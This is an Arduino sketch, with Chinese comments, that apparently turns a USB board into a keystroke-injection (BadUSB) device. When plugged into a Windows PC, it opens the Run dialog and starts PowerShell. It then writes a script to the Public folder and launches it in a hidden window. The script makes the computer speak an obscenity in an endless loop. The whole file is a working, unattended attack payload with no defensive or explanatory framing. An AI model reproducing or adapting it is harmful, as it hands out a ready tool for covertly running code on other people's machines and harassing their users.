void setup(){
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("POWERSHELL -NOP");
  Keyboard.println();
  delay(1000);
  Keyboard.println("\"DO{(nEW-oBJECT -com sAPI.sPvOICE).sPEAK('FUCK U')}WHILE(`$TRUE)\"|oUT-fILE C:\\USERS\\PUBLIC\\LEMONC.PS1;START-PROCESS POWERSHELL \"-NOP -W HIDDEN -C C:\\USERS\\PUBLIC\\LEMONC.PS1\";EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
